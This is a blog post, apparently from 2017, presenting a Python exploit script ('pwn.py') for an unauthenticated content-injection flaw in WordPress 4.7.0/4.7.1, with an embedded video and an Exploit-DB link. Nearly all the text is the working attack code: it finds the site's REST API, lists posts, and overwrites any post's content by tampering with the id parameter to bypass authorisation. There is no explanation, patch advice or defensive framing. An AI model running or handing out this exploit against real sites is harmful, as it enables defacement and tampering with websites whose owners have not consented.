---
layout: post
title: WordPress 4.7 â€“ Unauthenticated Content Injection
date: '2017-02-15T00:39:00.000+03:00'
author: k4y4
tags:
- WordPress 4.7 - Unauthenticated Content Injection
- WordPress 4.7 exploit
- WordPress 4.7.0 exploit
- WordPress 4.7.1 exploit
modified_time: '2017-02-15T00:39:20.565+03:00'
thumbnail: https://img.youtube.com/vi/TMVHOkPOGic/default.jpg
blogger_id: tag:blogger.com,1999:blog-4815567283606325798.post-1641043036872202301
blogger_orig_url: http://www.erdinckaya.org/2017/02/wordpress-47-unauthenticated-content.html
---

<div style="text-align: center;"><iframe allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/TMVHOkPOGic" width="560"></iframe><b>&nbsp;</b><br /><b>Python (pwn.py);</b></div><blockquote><div class="line number39 index38 alt2"><code class="py keyword">import</code> <code class="py plain">json</code></div><div class="line number40 index39 alt1"><code class="py keyword">import</code> <code class="py plain">sys</code></div><div class="line number41 index40 alt2"><code class="py keyword">import</code> <code class="py plain">urllib2</code></div><div class="line number43 index42 alt2"><code class="py keyword">from</code> <code class="py plain">lxml </code><code class="py keyword">import</code> <code class="py plain">etree</code></div><div class="line number46 index45 alt1"><code class="py keyword">def</code> <code class="py plain">get_api_url(wordpress_url):</code></div><div class="line number47 index46 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">response </code><code class="py keyword">=</code> <code class="py plain">urllib2.urlopen(wordpress_url)</code></div><div class="line number49 index48 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">data </code><code class="py keyword">=</code> <code class="py plain">etree.HTML(response.read())</code></div><div class="line number50 index49 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">u </code><code class="py keyword">=</code> <code class="py plain">data.xpath(</code><code class="py string">'//link[@rel="https://api.w.org/"]/@href'</code><code class="py plain">)[</code><code class="py value">0</code><code class="py plain">]</code></div><div class="line number52 index51 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments"># check if we have permalinks</code></div><div class="line number53 index52 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py keyword">if</code> <code class="py string">'rest_route'</code> <code class="py keyword">in</code> <code class="py plain">u:</code></div><div class="line number54 index53 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code><code class="py plain">(</code><code class="py string">' ! Warning, looks like permalinks are not enabled. This might not work!'</code><code class="py plain">)</code></div><div class="line number56 index55 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py keyword">return</code> <code class="py plain">u</code></div><div class="line number59 index58 alt2"><code class="py keyword">def</code> <code class="py plain">get_posts(api_base):</code></div><div class="line number60 index59 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">respone </code><code class="py keyword">=</code> <code class="py plain">urllib2.urlopen(api_base </code><code class="py keyword">+</code> <code class="py string">'wp/v2/posts'</code><code class="py plain">)</code></div><div class="line number61 index60 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">posts </code><code class="py keyword">=</code> <code class="py plain">json.loads(respone.read())</code></div><div class="line number63 index62 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py keyword">for</code> <code class="py plain">post </code><code class="py keyword">in</code> <code class="py plain">posts:</code></div><div class="line number64 index63 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code><code class="py plain">(</code><code class="py string">' - Post ID: {}, Title: {}, Url: {}'</code></div><div class="line number65 index64 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">.</code><code class="py functions">format</code><code class="py plain">(post[</code><code class="py string">'id'</code><code class="py plain">], post[</code><code class="py string">'title'</code><code class="py plain">][</code><code class="py string">'rendered'</code><code class="py plain">], post[</code><code class="py string">'link'</code><code class="py plain">]))</code></div><div class="line number68 index67 alt1"><code class="py keyword">def</code> <code class="py plain">update_post(api_base, post_id, post_content):</code></div><div class="line number69 index68 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments"># more than just the content field can be updated. see the api docs here:</code></div><div class="line number70 index69 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments"># https://developer.wordpress.org/rest-api/reference/posts/#update-a-post</code></div><div class="line number71 index70 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">data </code><code class="py keyword">=</code> <code class="py plain">json.dumps({</code></div><div class="line number72 index71 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py string">'content'</code><code class="py plain">: post_content</code></div><div class="line number73 index72 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">})</code></div><div class="line number75 index74 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">url </code><code class="py keyword">=</code> <code class="py plain">api_base </code><code class="py keyword">+</code> <code class="py string">'wp/v2/posts/{post_id}/?id={post_id}abc'</code><code class="py plain">.</code><code class="py functions">format</code><code class="py plain">(post_id</code><code class="py keyword">=</code><code class="py plain">post_id)</code></div><div class="line number76 index75 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">req </code><code class="py keyword">=</code> <code class="py plain">urllib2.Request(url, data, {</code><code class="py string">'Content-Type'</code><code class="py plain">: </code><code class="py string">'application/json'</code><code class="py plain">})</code></div><div class="line number77 index76 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">response </code><code class="py keyword">=</code> <code class="py plain">urllib2.urlopen(req).read()</code></div><div class="line number79 index78 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code><code class="py plain">(</code><code class="py string">'* Post updated. Check it out at {}'</code><code class="py plain">.</code><code class="py functions">format</code><code class="py plain">(json.loads(response)[</code><code class="py string">'link'</code><code class="py plain">]))</code></div><div class="line number82 index81 alt1"><code class="py keyword">def</code> <code class="py plain">print_usage():</code></div><div class="line number83 index82 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code><code class="py plain">(</code><code class="py string">'Usage: {} <url> (optional: <post_id> <file post_content="" with="">)'</file></post_id></url></code><code class="py plain">.</code><code class="py functions">format</code><code class="py plain">(__file__))</code></div><div class="line number86 index85 alt1"><code class="py keyword">if</code> <code class="py plain">__name__ </code><code class="py keyword">=</code><code class="py keyword">=</code> <code class="py string">'__main__'</code><code class="py plain">:</code></div><div class="line number88 index87 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments"># ensure we have at least a url</code></div><div class="line number89 index88 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py keyword">if</code> <code class="py functions">len</code><code class="py plain">(sys.argv) &lt; </code><code class="py value">2</code><code class="py plain">:</code></div><div class="line number90 index89 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">print_usage()</code></div><div class="line number91 index90 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">sys.exit(</code><code class="py value">1</code><code class="py plain">)</code></div><div class="line number93 index92 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments"># if we have a post id, we need content too</code></div><div class="line number94 index93 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py keyword">if</code> <code class="py value">2</code> <code class="py plain">&lt; </code><code class="py functions">len</code><code class="py plain">(sys.argv) &lt; </code><code class="py value">4</code><code class="py plain">:</code></div><div class="line number95 index94 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code><code class="py plain">(</code><code class="py string">'Please provide a file with post content with a post id'</code><code class="py plain">)</code></div><div class="line number96 index95 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">print_usage()</code></div><div class="line number97 index96 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">sys.exit(</code><code class="py value">1</code><code class="py plain">)</code></div><div class="line number99 index98 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code><code class="py plain">(</code><code class="py string">'* Discovering API Endpoint'</code><code class="py plain">)</code></div><div class="line number100 index99 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">api_url </code><code class="py keyword">=</code> <code class="py plain">get_api_url(sys.argv[</code><code class="py value">1</code><code class="py plain">])</code></div><div class="line number101 index100 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code><code class="py plain">(</code><code class="py string">'* API lives at: {}'</code><code class="py plain">.</code><code class="py functions">format</code><code class="py plain">(api_url))</code></div><div class="line number103 index102 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments"># if we only have a url, show the posts we have have</code></div><div class="line number104 index103 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py keyword">if</code> <code class="py functions">len</code><code class="py plain">(sys.argv) &lt; </code><code class="py value">3</code><code class="py plain">:</code></div><div class="line number105 index104 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code><code class="py plain">(</code><code class="py string">'* Getting available posts'</code><code class="py plain">)</code></div><div class="line number106 index105 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">get_posts(api_url)</code></div><div class="line number108 index107 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">sys.exit(</code><code class="py value">0</code><code class="py plain">)</code></div><div class="line number110 index109 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py comments"># if we get here, we have what we need to update a post!</code></div><div class="line number111 index110 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code><code class="py plain">(</code><code class="py string">'* Updating post {}'</code><code class="py plain">.</code><code class="py functions">format</code><code class="py plain">(sys.argv[</code><code class="py value">2</code><code class="py plain">]))</code></div><div class="line number112 index111 alt1"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">with </code><code class="py functions">open</code><code class="py plain">(sys.argv[</code><code class="py value">3</code><code class="py plain">], </code><code class="py string">'r'</code><code class="py plain">) as content:</code></div><div class="line number113 index112 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">new_content </code><code class="py keyword">=</code> <code class="py plain">content.readlines()</code></div><div class="line number115 index114 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py plain">update_post(api_url, sys.argv[</code><code class="py value">2</code><code class="py plain">], ''.join(new_content))</code></div><div class="line number117 index116 alt2"><code class="py spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="py functions">print</code><code class="py plain">(</code><code class="py string">'* Update complete!'</code><code class="py plain">)</code></div></blockquote><div style="text-align: center;"><a href="https://www.exploit-db.com/exploits/41223/" target="_blank">https://www.exploit-db.com/exploits/41223/</a></div>